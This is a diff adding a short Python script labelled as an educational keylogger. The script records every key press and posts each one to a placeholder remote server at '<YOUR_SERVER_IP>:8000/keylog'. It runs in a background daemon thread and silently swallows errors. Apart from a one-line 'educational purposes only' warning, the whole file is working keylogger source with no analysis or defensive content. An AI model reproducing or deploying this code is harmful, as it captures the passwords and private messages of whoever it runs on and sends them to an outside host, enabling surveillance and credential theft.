@@ -1,0 +1,23 @@
+
+        # Educational Keylogger Script
+        # WARNING: For educational purposes only
+        import keyboard
+        import requests
+        import threading
+
+        def send_key(key):
+            try:
+                requests.post('http://<YOUR_SERVER_IP>:8000/keylog', 
+                            json={'key': key}, 
+                            timeout=5)
+            except:
+                pass
+
+        def keylogger():
+            while True:
+                event = keyboard.read_event()
+                if event.event_type == keyboard.KEY_DOWN:
+                    send_key(event.name)
+
+        threading.Thread(target=keylogger, daemon=True).start()
+        
